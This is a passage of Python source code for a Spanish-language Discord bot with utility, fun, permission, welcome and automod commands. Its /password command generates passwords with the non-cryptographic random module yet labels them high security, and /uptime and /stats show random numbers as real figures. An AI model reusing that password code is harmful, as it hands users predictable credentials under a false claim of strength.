            "❌ El tiempo debe ser entre 1 minuto y 1440 minutos (24 horas).",
            ephemeral=True)
        return

    end_time = datetime.datetime.utcnow() + datetime.timedelta(minutes=time)

    embed = discord.Embed(title="⏰ Recordatorio Establecido",
                          description=f"Te recordaré en **{time} minutos**",
                          color=discord.Color.blue())
    embed.add_field(name="📝 Mensaje", value=message, inline=False)
    embed.add_field(name="🕐 Te recordaré",
                    value=f"<t:{int(end_time.timestamp())}:R>",
                    inline=False)

    await interaction.response.send_message(embed=embed)

    # Esperar y enviar recordatorio
    await asyncio.sleep(time * 60)

    # Verificar si el temporizador sigue activo
    if timer_id in active_timers:
        timer_data = active_timers[timer_id]

        try:
            # Crear embed de notificación
            notification_embed = discord.Embed(title="🔔 ¡RECORDATORIO!",
                                               description=message,
                                               color=discord.Color.orange())
            notification_embed.add_field(name="⏱️ Duración",
                                         value=f"{time} minutos",
                                         inline=True)
            notification_embed.set_footer(
                text=f"Recordatorio de hace {time} minutos")

            # Mencionar al usuario
            channel = bot.get_channel(timer_data['channel_id'])
            if channel:
                user = bot.get_user(timer_data['user_id'])
                user_mention = user.mention if user else f"<@{timer_data['user_id']}>"
                await channel.send(f"🔔 {user_mention}",
                                   embed=notification_embed)

            # Limpiar del registro
            del active_timers[timer_id]

        except Exception as e:
            print(f"Error al enviar notificación de temporizador: {e}")
            # Limpiar del registro incluso si hay error
            if timer_id in active_timers:
                del active_timers[timer_id]


@bot.tree.command(name='flip', description='Lanzar una moneda')
async def flip_command(interaction: discord.Interaction):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    result = random.choice(["🪙 Cara", "🔄 Cruz"])

    embed = discord.Embed(title="🪙 Lanzamiento de Moneda",
                          description=f"**Resultado: {result}**",
                          color=discord.Color.gold())

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name='dice', description='Lanzar dados')
@discord.app_commands.describe(
    sides="Número de caras del dado (por defecto 6)",
    count="Cantidad de dados (por defecto 1)")
async def dice_command(interaction: discord.Interaction,
                       sides: int = 6,
                       count: int = 1):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    if sides < 2 or sides > 100:
        await interaction.response.send_message(
            "❌ El dado debe tener entre 2 y 100 caras.", ephemeral=True)
        return

    if count < 1 or count > 10:
        await interaction.response.send_message(
            "❌ Puedes lanzar entre 1 y 10 dados.", ephemeral=True)
        return

    results = [random.randint(1, sides) for _ in range(count)]
    total = sum(results)

    embed = discord.Embed(title=f"🎲 Lanzamiento de Dados (d{sides})",
                          color=discord.Color.red())

    embed.add_field(name="🎯 Resultados",
                    value=" | ".join([f"**{r}**" for r in results]),
                    inline=False)
    embed.add_field(name="📊 Total", value=f"**{total}**", inline=True)
    embed.add_field(name="📈 Promedio",
                    value=f"**{total/count:.1f}**",
                    inline=True)

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name='password', description='Generar contraseña segura')
@discord.app_commands.describe(length="Longitud de la contraseña (8-50)")
async def password_command(interaction: discord.Interaction, length: int = 12):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    if length < 8 or length > 50:
        await interaction.response.send_message(
            "❌ La longitud debe ser entre 8 y 50 caracteres.", ephemeral=True)
        return

    import string
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    password = ''.join(random.choice(chars) for _ in range(length))

    embed = discord.Embed(title="🔐 Contraseña Generada",
                          description=f"```{password}```",
                          color=discord.Color.green())
    embed.add_field(name="📏 Longitud",
                    value=f"{length} caracteres",
                    inline=True)
    embed.add_field(name="🔒 Seguridad", value="Alta", inline=True)
    embed.set_footer(text="⚠️ Guarda esta contraseña en un lugar seguro")

    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name='quote', description='Cita inspiradora aleatoria')
async def quote_command(interaction: discord.Interaction):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    quotes = [
        ("La vida es lo que ocurre mientras estás ocupado haciendo otros planes.",
         "John Lennon"),
        ("El único modo de hacer un gran trabajo es amar lo que haces.",
         "Steve Jobs"),
        ("La imaginación es más importante que el conocimiento.",
         "Albert Einstein"),
        ("El éxito es ir de fracaso en fracaso sin perder el entusiasmo.",
         "Winston Churchill"),
        ("La imaginación es más importante que el conocimiento.",
         "Albert Einstein"),
        ("No puedes conectar los puntos mirando hacia adelante.",
         "Steve Jobs"),
        ("La única forma de hacer algo bien es hacerlo con pasión.",
         "Anónimo"),
        ("El fracaso es simplemente la oportunidad de comenzar de nuevo.",
         "Henry Ford"),
        ("Tu tiempo es limitado, no lo malgastes viviendo la vida de otro.",
         "Steve Jobs"),
        ("La diferencia entre lo ordinario y lo extraordinario es ese pequeño extra.",
         "Jimmy Johnson")
    ]

    quote_text, author = random.choice(quotes)

    embed = discord.Embed(title="💭 Cita Inspiradora",
                          description=f"*\"{quote_text}\"*",
                          color=discord.Color.purple())
    embed.set_footer(text=f"— {author}")

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name='translate', description='Traductor simulado')
@discord.app_commands.describe(text="Texto a traducir",
                               target_lang="Idioma objetivo")
async def translate_command(interaction: discord.Interaction, text: str,
                            target_lang: str):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    # Simulación de traducción
    translations = {
        "english": f"[EN] {text} (translated)",
        "spanish": f"[ES] {text} (traducido)",
        "french": f"[FR] {text} (traduit)",
        "german": f"[DE] {text} (übersetzt)",
        "italian": f"[IT] {text} (tradotto)",
        "portuguese": f"[PT] {text} (traduzido)"
    }

    target = target_lang.lower()
    if target in translations:
        result = translations[target]
    else:
        result = f"[{target_lang.upper()}] {text} (simulated translation)"

    embed = discord.Embed(title="🌐 Traductor", color=discord.Color.blue())
    embed.add_field(name="📝 Original", value=text, inline=False)
    embed.add_field(name="🔄 Traducido", value=result, inline=False)
    embed.add_field(name="🎯 Idioma", value=target_lang.title(), inline=True)
    embed.set_footer(text="⚠️ Traducción simulada - No real")

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name='joke', description='Contar un chiste aleatorio')
async def joke_command(interaction: discord.Interaction):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    jokes = [
        "¿Por qué los programadores prefieren el modo oscuro? Porque la luz atrae a los bugs! 🐛",
        "¿Cómo se llama un boomerang que no vuelve? Un palo. 🪃",
        "¿Por qué los pájaros vuelan hacia el sur en invierno? Porque es muy lejos para caminar. 🐦",
        "¿Qué le dice un taco a otro taco? ¿Quieres que salgamos esta noche? 🌮",
        "¿Por qué los desarrolladores odian la naturaleza? Tiene demasiados bugs. 🌿",
        "¿Qué hace una abeja en el gimnasio? ¡Zum-ba! 🐝"
    ]

    joke = random.choice(jokes)

    embed = discord.Embed(title="😂 Chiste del Día",
                          description=joke,
                          color=discord.Color.orange())

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name='color', description='Generar un color aleatorio')
async def color_command(interaction: discord.Interaction):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    # Generar color aleatorio
    color_int = random.randint(0, 16777215)  # 0xFFFFFF
    hex_color = f"#{color_int:06x}".upper()

    # Valores RGB
    r = (color_int >> 16) & 255
    g = (color_int >> 8) & 255
    b = color_int & 255

    embed = discord.Embed(title="🎨 Color Aleatorio",
                          color=discord.Color(color_int))

    embed.add_field(name="🔢 HEX", value=f"`{hex_color}`", inline=True)
    embed.add_field(name="🌈 RGB", value=f"`({r}, {g}, {b})`", inline=True)
    embed.add_field(name="🎯 Decimal", value=f"`{color_int}`", inline=True)

    # Cuadrado de color simulado
    embed.add_field(name="🎨 Vista Previa",
                    value="El color se muestra en el borde de este embed",
                    inline=False)

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name='base64',
                  description='Codificar/decodificar texto en Base64')
@discord.app_commands.describe(action="encode o decode",
                               text="Texto a procesar")
async def base64_command(interaction: discord.Interaction, action: str,
                         text: str):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    try:
        import base64

        if action.lower() == "encode":
            encoded = base64.b64encode(text.encode('utf-8')).decode('utf-8')

            embed = discord.Embed(title="🔐 Base64 Encoder",
                                  color=discord.Color.green())
            embed.add_field(name="📝 Original",
                            value=f"```{text}```",
                            inline=False)
            embed.add_field(name="🔒 Codificado",
                            value=f"```{encoded}```",
                            inline=False)

        elif action.lower() == "decode":
            try:
                decoded = base64.b64decode(
                    text.encode('utf-8')).decode('utf-8')

                embed = discord.Embed(title="🔓 Base64 Decoder",
                                      color=discord.Color.blue())
                embed.add_field(name="🔒 Codificado",
                                value=f"```{text}```",
                                inline=False)
                embed.add_field(name="📝 Decodificado",
                                value=f"```{decoded}```",
                                inline=False)
            except:
                await interaction.response.send_message(
                    "❌ El texto no es válido en Base64.", ephemeral=True)
                return
        else:
            await interaction.response.send_message(
                "❌ Acción debe ser 'encode' o 'decode'.", ephemeral=True)
            return

        await interaction.response.send_message(embed=embed)

    except Exception as e:
        await interaction.response.send_message(
            f"❌ Error procesando Base64: {str(e)}", ephemeral=True)


@bot.tree.command(name='uptime', description='Ver tiempo de actividad del bot')
async def uptime_command(interaction: discord.Interaction):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    # Simular tiempo de actividad
    days = random.randint(0, 30)
    hours = random.randint(0, 23)
    minutes = random.randint(0, 59)

    embed = discord.Embed(
        title="⏱️ Tiempo de Actividad",
        description=
        f"**{days}** días, **{hours}** horas, **{minutes}** minutos",
        color=discord.Color.green())

    embed.add_field(name="📊 Estado", value="🟢 En línea", inline=True)
    embed.add_field(name="🌐 Servidores",
                    value=f"{len(bot.guilds)}",
                    inline=True)
    embed.add_field(name="👥 Usuarios", value=f"~{len(bot.users)}", inline=True)

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name='choose', description='Elegir entre opciones')
@discord.app_commands.describe(options="Opciones separadas por comas")
async def choose_command(interaction: discord.Interaction, options: str):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    choices = [
        choice.strip() for choice in options.split(',') if choice.strip()
    ]

    if len(choices) < 2:
        await interaction.response.send_message(
            "❌ Necesitas al menos 2 opciones separadas por comas.",
            ephemeral=True)
        return

    chosen = random.choice(choices)

    embed = discord.Embed(title="🎯 Elección Aleatoria",
                          description=f"**He elegido:** {chosen}",
                          color=discord.Color.gold())

    embed.add_field(name="📝 Opciones",
                    value="\n".join([f"• {choice}" for choice in choices]),
                    inline=False)

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name='ascii', description='Convertir texto a arte ASCII')
@discord.app_commands.describe(text="Texto a convertir (máximo 10 caracteres)")
async def ascii_command(interaction: discord.Interaction, text: str):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    if len(text) > 10:
        await interaction.response.send_message("❌ Máximo 10 caracteres.",
                                                ephemeral=True)
        return

    # ASCII art simple simulado
    ascii_art = f"""
```
██╗  {text.upper()}  ██╗
████╗   ███████   ████╗
╚═══╝   ╚══════╝  ╚═══╝
```"""

    embed = discord.Embed(title="🎨 Arte ASCII",
                          description=ascii_art,
                          color=discord.Color.blue())
    embed.set_footer(text="⚠️ Arte ASCII simulado")

    await interaction.response.send_message(embed=embed)


# ================================
# COMANDOS DE PERMISOS PERSONALIZADO Y COMANDOS DE MODERACIÓN
# ================================

# Sistema de permisos personalizado
custom_permissions_file = 'custom_permissions.json'
if os.path.exists(custom_permissions_file):
    with open(custom_permissions_file, 'r') as f:
        custom_permissions = json.load(f)
else:
    custom_permissions = {}


def save_custom_permissions():
    with open(custom_permissions_file, 'w') as f:
        json.dump(custom_permissions, f)


def get_user_permissions(user_id, guild_id):
    """Obtener permisos personalizados de un usuario"""
    user_id = str(user_id)
    guild_id = str(guild_id)

    if guild_id not in custom_permissions:
        custom_permissions[guild_id] = {}

    guild_perms = custom_permissions[guild_id]
    return guild_perms.get(user_id, {"can_execute_commands": False})


def set_user_permissions(user_id, guild_id, permissions):
    """Establecer permisos personalizados para un usuario"""
    user_id = str(user_id)
    guild_id = str(guild_id)

    if guild_id not in custom_permissions:
        custom_permissions[guild_id] = {}

    custom_permissions[guild_id][user_id] = permissions
    save_custom_permissions()


def get_role_permissions(role_id, guild_id):
    """Obtener permisos personalizados de un rol"""
    role_id = str(role_id)
    guild_id = str(guild_id)

    if guild_id not in custom_permissions:
        custom_permissions[guild_id] = {}

    guild_perms = custom_permissions[guild_id]
    role_key = f"role_{role_id}"
    return guild_perms.get(role_key, {"can_execute_commands": False})


def set_role_permissions(role_id, guild_id, permissions):
    """Establecer permisos personalizados para un rol"""
    role_id = str(role_id)
    guild_id = str(guild_id)

    if guild_id not in custom_permissions:
        custom_permissions[guild_id] = {}

    role_key = f"role_{role_id}"
    custom_permissions[guild_id][role_key] = permissions
    save_custom_permissions()


def user_has_permission(user, guild, permission_type):
    """Verificar si un usuario tiene un permiso específico"""
    if not guild:
        return False

    # El owner del servidor siempre tiene todos los permisos
    if user.id == guild.owner_id:
        return True

    # Verificar permisos de usuario directo
    user_perms = get_user_permissions(user.id, guild.id)
    if user_perms.get(permission_type, False):
        return True

    # Verificar permisos de roles
    for role in user.roles:
        role_perms = get_role_permissions(role.id, guild.id)
        if role_perms.get(permission_type, False):
            return True

    return False


@bot.tree.command(name='say', description='Hacer que el bot envíe un mensaje')
@discord.app_commands.describe(
    message="Mensaje que el bot enviará",
    channel="Canal donde enviar el mensaje (opcional)")
async def say_command(interaction: discord.Interaction,
                      message: str,
                      channel: discord.TextChannel = None):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    # Solo el owner del servidor o usuarios con permisos personalizados
    if not (interaction.user.id == interaction.guild.owner_id
            or user_has_permission(interaction.user, interaction.guild,
                                   "can_execute_commands")):
        await interaction.response.send_message(
            "❌ Solo el propietario del servidor o usuarios con permisos especiales pueden usar este comando.",
            ephemeral=True)
        return

    target_channel = channel or interaction.channel

    # Verificar permisos del bot en el canal objetivo
    if not target_channel.permissions_for(interaction.guild.me).send_messages:
        await interaction.response.send_message(
            f"❌ No tengo permisos para enviar mensajes en {target_channel.mention}",
            ephemeral=True)
        return

    try:
        # Enviar el mensaje
        await target_channel.send(message)

        # Confirmar al usuario
        if channel and channel != interaction.channel:
            await interaction.response.send_message(
                f"✅ Mensaje enviado en {target_channel.mention}",
                ephemeral=True)
        else:
            await interaction.response.send_message("✅ Mensaje enviado",
                                                    ephemeral=True)

        # Log del comando
        print(
            f"Comando /say usado por {interaction.user.name} en {interaction.guild.name}"
        )

    except Exception as e:
        await interaction.response.send_message(
            f"❌ Error al enviar mensaje: {str(e)}", ephemeral=True)


@bot.tree.command(name='giveperms',
                  description='Otorgar permisos especiales a usuarios o roles')
@discord.app_commands.describe(target="Usuario o rol al que otorgar permisos",
                               action="Tipo de acción (can_execute_commands)",
                               value="true o false")
async def giveperms_command(interaction: discord.Interaction, target: str,
                            action: str, value: bool):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    # Solo el owner del servidor puede usar este comando
    if interaction.user.id != interaction.guild.owner_id:
        await interaction.response.send_message(
            "❌ Solo el propietario del servidor puede usar este comando.",
            ephemeral=True)
        return

    # Validar acción
    valid_actions = ["can_execute_commands"]
    if action not in valid_actions:
        await interaction.response.send_message(
            f"❌ Acción inválida. Acciones disponibles: {', '.join(valid_actions)}",
            ephemeral=True)
        return


# Procesar el target (usuario o rol)
    target_user = None
    target_role = None

    # Intentar convertir a mención de usuario
    if target.startswith('<@') and target.endswith('>'):
        user_id = target.strip('<@!>')
        try:
            target_user = interaction.guild.get_member(int(user_id))
        except:
            pass

    # Intentar convertir a mención de rol
    elif target.startswith('<@&') and target.endswith('>'):
        role_id = target.strip('<@&>')
        try:
            target_role = interaction.guild.get_role(int(role_id))
        except:
            pass

    # Buscar por nombre si no es mención
    if not target_user and not target_role:
        # Buscar usuario por nombre
        target_user = discord.utils.get(interaction.guild.members, name=target)
        if not target_user:
            target_user = discord.utils.get(interaction.guild.members,
                                            display_name=target)

        # Buscar rol por nombre si no se encontró usuario
        if not target_user:
            target_role = discord.utils.get(interaction.guild.roles,
                                            name=target)

    if not target_user and not target_role:
        await interaction.response.send_message(
            "❌ No se encontró el usuario o rol especificado. Usa menciones (@usuario o @rol) o nombres exactos.",
            ephemeral=True)
        return

    # Aplicar permisos
    try:
        if target_user:
            # Obtener permisos actuales del usuario
            current_perms = get_user_permissions(target_user.id,
                                                 interaction.guild.id)
            current_perms[action] = value
            set_user_permissions(target_user.id, interaction.guild.id,
                                 current_perms)

            embed = discord.Embed(
                title="✅ Permisos Actualizados",
                description=
                f"Permisos modificados para **{target_user.display_name}**",
                color=discord.Color.green())
            embed.add_field(name="👤 Usuario",
                            value=target_user.mention,
                            inline=True)
            embed.add_field(name="⚙️ Acción", value=action, inline=True)
            embed.add_field(name="✅ Valor",
                            value="Permitido" if value else "Denegado",
                            inline=True)

        elif target_role:
            # Obtener permisos actuales del rol
            current_perms = get_role_permissions(target_role.id,
                                                 interaction.guild.id)
            current_perms[action] = value
            set_role_permissions(target_role.id, interaction.guild.id,
                                 current_perms)

            embed = discord.Embed(
                title="✅ Permisos Actualizados",
                description=
                f"Permisos modificados para el rol **{target_role.name}**",
                color=discord.Color.green())
            embed.add_field(name="🏷️ Rol",
                            value=target_role.mention,
                            inline=True)
            embed.add_field(name="⚙️ Acción", value=action, inline=True)
            embed.add_field(name="✅ Valor",
                            value="Permitido" if value else "Denegado",
                            inline=True)

        embed.set_footer(
            text=f"Comando ejecutado por {interaction.user.display_name}")
        await interaction.response.send_message(embed=embed)

        # Log del comando
        target_name = target_user.display_name if target_user else target_role.name
        target_type = "usuario" if target_user else "rol"
        print(
            f"Permisos modificados por {interaction.user.name}: {target_name} ({target_type}) - {action}: {value}"
        )

    except Exception as e:
        await interaction.response.send_message(
            f"❌ Error al modificar permisos: {str(e)}", ephemeral=True)


@bot.tree.command(name='viewperms',
                  description='Ver permisos especiales de usuarios y roles')
@discord.app_commands.describe(
    target="Usuario o rol del que ver permisos (opcional)")
async def viewperms_command(interaction: discord.Interaction,
                            target: str = None):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    # Solo el owner del servidor puede ver todos los permisos
    if interaction.user.id != interaction.guild.owner_id:
        await interaction.response.send_message(
            "❌ Solo el propietario del servidor puede ver los permisos.",
            ephemeral=True)
        return

    guild_id = str(interaction.guild.id)

    if guild_id not in custom_permissions:
        await interaction.response.send_message(
            "❌ No hay permisos personalizados configurados en este servidor.",
            ephemeral=True)
        return

    guild_perms = custom_permissions[guild_id]

    if target:
        # Mostrar permisos de un target específico
        target_user = None
        target_role = None

        # Buscar usuario o rol
        if target.startswith('<@') and target.endswith('>'):
            user_id = target.strip('<@!>')
            try:
                target_user = interaction.guild.get_member(int(user_id))
            except:
                pass
        elif target.startswith('<@&') and target.endswith('>'):
            role_id = target.strip('<@&>')
            try:
                target_role = interaction.guild.get_role(int(role_id))
            except:
                pass
        else:
            target_user = discord.utils.get(interaction.guild.members,
                                            name=target)
            if not target_user:
                target_user = discord.utils.get(interaction.guild.members,
                                                display_name=target)

        # Buscar rol por nombre si no se encontró usuario
        if not target_user:
            target_role = discord.utils.get(interaction.guild.roles,
                                            name=target)

        if not target_user and not target_role:
            await interaction.response.send_message(
                "❌ No se encontró el usuario o rol especificado. Usa menciones (@usuario o @rol) o nombres exactos.",
                ephemeral=True)
            return

        if target_user:
            perms = get_user_permissions(target_user.id, interaction.guild.id)
            embed = discord.Embed(
                title=f"🔍 Permisos de {target_user.display_name}",
                color=discord.Color.blue())
            embed.set_thumbnail(url=target_user.display_avatar.url)
        else:
            perms = get_role_permissions(target_role.id, interaction.guild.id)
            embed = discord.Embed(
                title=f"🔍 Permisos del rol {target_role.name}",
                color=target_role.color if target_role.color
                != discord.Color.default() else discord.Color.blue())

        perms_text = ""
        for perm, value in perms.items():
            status = "✅ Permitido" if value else "❌ Denegado"
            perms_text += f"**{perm}:** {status}\n"

        if not perms_text:
            perms_text = "Sin permisos especiales configurados"

        embed.add_field(name="⚙️ Permisos", value=perms_text, inline=False)

    else:
        # Mostrar todos los permisos del servidor
        embed = discord.Embed(
            title=f"🔍 Permisos Especiales - {interaction.guild.name}",
            color=discord.Color.blue())

        users_with_perms = []
        roles_with_perms = []

        for key, perms in guild_perms.items():
            if key.startswith("role_"):
                role_id = key.replace("role_", "")
                role = interaction.guild.get_role(int(role_id))
                if role:
                    roles_with_perms.append((role.name, perms))
            else:
                user = interaction.guild.get_member(int(key))
                if user:
                    users_with_perms.append((user.display_name, perms))

        if users_with_perms:
            users_text = ""
            for name, perms in users_with_perms:
                active_perms = [perm for perm, value in perms.items() if value]
                if active_perms:
                    users_text += f"**{name}:** {', '.join(active_perms)}\n"

            if users_text:
                embed.add_field(name="👥 Usuarios",
                                value=users_text,
                                inline=False)

        if roles_with_perms:
            roles_text = ""
            for name, perms in roles_with_perms:
                active_perms = [perm for perm, value in perms.items() if value]
                if active_perms:
                    roles_text += f"**{name}:** {', '.join(active_perms)}\n"

            if roles_text:
                embed.add_field(name="🏷️ Roles",
                                value=roles_text,
                                inline=False)

        if not users_with_perms and not roles_with_perms:
            embed.description = "No hay permisos especiales configurados."

    await interaction.response.send_message(embed=embed)


# ================================
# COMANDOS DE INFORMACIÓN Y ESTADÍSTICAS
# ================================


@bot.tree.command(name='stats', description='Estadísticas del servidor')
async def stats_command(interaction: discord.Interaction):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    guild = interaction.guild
    if not guild:
        await interaction.response.send_message(
            "❌ Este comando solo funciona en servidores.", ephemeral=True)
        return

    # Contar tipos de canales
    text_channels = len(
        [c for c in guild.channels if isinstance(c, discord.TextChannel)])
    voice_channels = len(
        [c for c in guild.channels if isinstance(c, discord.VoiceChannel)])
    categories = len(
        [c for c in guild.channels if isinstance(c, discord.CategoryChannel)])

    # Contar miembros online (simulado)
    online_members = random.randint(1, min(50, guild.member_count or 10))

    embed = discord.Embed(title=f"📊 Estadísticas de {guild.name}",
                          color=discord.Color.blue())

    embed.add_field(name="👥 Miembros",
                    value=guild.member_count or "No disponible",
                    inline=True)
    embed.add_field(name="🟢 En línea", value=online_members, inline=True)
    embed.add_field(name="🏷️ Roles", value=len(guild.roles), inline=True)

    embed.add_field(name="📝 Canales de texto",
                    value=text_channels,
                    inline=True)
    embed.add_field(name="🔊 Canales de voz", value=voice_channels, inline=True)
    embed.add_field(name="📁 Categorías", value=categories, inline=True)

    embed.add_field(name="😄 Emojis", value=len(guild.emojis), inline=True)
    embed.add_field(name="🎉 Boosts",
                    value=guild.premium_subscription_count or 0,
                    inline=True)
    embed.add_field(name="⭐ Nivel boost",
                    value=f"Nivel {guild.premium_tier}",
                    inline=True)

    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name='roles',
                  description='Lista todos los roles del servidor')
async def roles_command(interaction: discord.Interaction):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    guild = interaction.guild
    if not guild:
        await interaction.response.send_message(
            "❌ Este comando solo funciona en servidores.", ephemeral=True)
        return

    roles = sorted(guild.roles, key=lambda r: r.position, reverse=True)

    embed = discord.Embed(title=f"🏷️ Roles en {guild.name}",
                          description=f"Total: **{len(roles)}** roles",
                          color=discord.Color.blue())

    role_list = ""
    for i, role in enumerate(roles[:20]):  # Mostrar máximo 20
        if role.name != "@everyone":
            member_count = len(role.members)
            role_list += f"**{role.name}** - {member_count} miembro{'s' if member_count != 1 else ''}\n"

    if role_list:
        embed.add_field(name="📋 Lista de Roles", value=role_list, inline=False)

    if len(roles) > 20:
        embed.set_footer(text=f"Mostrando 20 de {len(roles)} roles")

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name='channels',
                  description='Lista todos los canales del servidor')
async def channels_command(interaction: discord.Interaction):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    guild = interaction.guild
    if not guild:
        await interaction.response.send_message(
            "❌ Este comando solo funciona en servidores.", ephemeral=True)
        return

    text_channels = [
        c for c in guild.channels if isinstance(c, discord.TextChannel)
    ]
    voice_channels = [
        c for c in guild.channels if isinstance(c, discord.VoiceChannel)
    ]

    embed = discord.Embed(title=f"📋 Canales en {guild.name}",
                          color=discord.Color.blue())

    if text_channels:
        text_list = "\n".join([f"💬 {c.name}" for c in text_channels[:15]])
        embed.add_field(name="💬 Canales de Texto",
                        value=text_list,
                        inline=False)

    if voice_channels:
        voice_list = "\n".join([f"🎤 {c.name}" for c in voice_channels[:15]])
        embed.add_field(name="🎤 Canales de Voz",
                        value=voice_list,
                        inline=False)

    total_channels = len(guild.channels)
    if total_channels > 30:
        embed.set_footer(
            text=f"Mostrando algunos de {total_channels} canales totales")

    await interaction.response.send_message(embed=embed)


# ================================
# COMANDOS DE BIENVENIDA
# ================================

# Configuración de bienvenidas
welcome_settings_file = 'welcome_settings.json'
if os.path.exists(welcome_settings_file):
    with open(welcome_settings_file, 'r') as f:
        welcome_settings = json.load(f)
else:
    welcome_settings = {}


def save_welcome_settings():
    with open(welcome_settings_file, 'w') as f:
        json.dump(welcome_settings, f, indent=4)


@bot.event
async def on_member_join(member):
    guild = member.guild
    guild_id = str(guild.id)

    # Sistema de bienvenidas
    if guild_id in welcome_settings and welcome_settings[guild_id]['enabled']:
        settings = welcome_settings[guild_id]
        channel_id = settings['channel_id']
        message_template = settings['message']

        try:
            channel = guild.get_channel(channel_id)
            if channel:
                # Formatear mensaje de bienvenida
                message = message_template.replace('{user}', member.mention)
                message = message.replace('{username}', member.display_name)
                message = message.replace('{server}', guild.name)

                embed = discord.Embed(title="👋 ¡Bienvenido!",
                                      description=message,
                                      color=discord.Color.green())
                embed.set_thumbnail(url=member.display_avatar.url)
                embed.set_footer(text=f"ID del usuario: {member.id}")

                await channel.send(embed=embed)
        except Exception as e:
            print(
                f"Error al enviar mensaje de bienvenida en {guild.name}: {e}")


@bot.event
async def on_message(message):
    if message.author.bot:
        return

    guild = message.guild
    guild_id = guild.id if guild else None

    # Debug: imprimir información del mensaje si es un comando de economía
    if message.content.startswith('.'):
        print(f"Comando detectado: {message.content} por {message.author.name}")

    # Sistema de automod
    if guild_id and automod_enabled.get(guild_id, False):
        settings = automod_settings.get(guild_id, {})
        spam_limit = settings.get('spam_limit', 5)
        warn_threshold = settings.get('warn_threshold', 3)

        # 1. Detección de Spam de Mensajes
        now = datetime.datetime.utcnow().timestamp()
        user_id = message.author.id
        guild_user_id = f"{guild_id}-{user_id}"

        if guild_user_id not in user_message_timestamps:
            user_message_timestamps[guild_user_id] = []

        # Limpiar timestamps antiguos (más de 1 minuto)
        user_message_timestamps[guild_user_id] = [
            ts for ts in user_message_timestamps[guild_user_id]
            if now - ts < 60
        ]

        # Añadir timestamp actual
        user_message_timestamps[guild_user_id].append(now)

        if len(user_message_timestamps[guild_user_id]) > spam_limit:
            try:
                await message.delete()
                # Aplicar advertencia y posible castigo
                await apply_automod_action(message, guild_id, user_id, "spam")
            except:
                pass  # Ignorar errores de permisos o mensaje ya eliminado

        # 2. Detección de Palabras Prohibidas
        content_lower = message.content.lower()
        if any(word in content_lower for word in banned_words):
            try:
                await message.delete()
                await apply_automod_action(message, guild_id, user_id,
                                           "palabra_prohibida")
            except:
                pass

        # 3. Detección de Links Maliciosos (simplificado)
        if "http://" in content_lower or "https://" in content_lower:
            # Aquí se podría implementar una verificación más robusta de links
            # Por ahora, solo como ejemplo de detección
            if any(link in content_lower
                   for link in ["discord.gg/", "bit.ly/", "tinyurl.com/"]):
                await message.delete()
                await apply_automod_action(message, guild_id, user_id,
                                           "link_malicioso")

        # 4. Detección de Menciones Masivas
        if len(message.mentions) > 10:  # Más de 10 menciones
            await message.delete()
            await apply_automod_action(message, guild_id, user_id,
                                       "mencion_masiva")

    # Sistema de niveles (XP por mensaje)
    if guild_id:
        await process_level_system(message)

    # IMPORTANTE: Procesar comandos
    await bot.process_commands(message)


async def apply_automod_action(message, guild_id, user_id, reason):
    """Aplica acciones de automod (advertencia, castigo)"""
    if user_id not in warning_counts:
        warning_counts[user_id] = {}

    warning_counts[user_id][reason] = warning_counts[user_id].get(reason,
                                                                  0) + 1
    total_warnings = sum(warning_counts[user_id].values())
    threshold = automod_settings[guild_id]['warn_threshold']

    embed = discord.Embed(
        title="🚫 Acción de Moderación",
        description=f"{message.author.mention} ha sido advertido por {reason}.",
        color=discord.Color.red())
    embed.add_field(name="⚠️ Advertencias",
                    value=f"{total_warnings}/{threshold}",
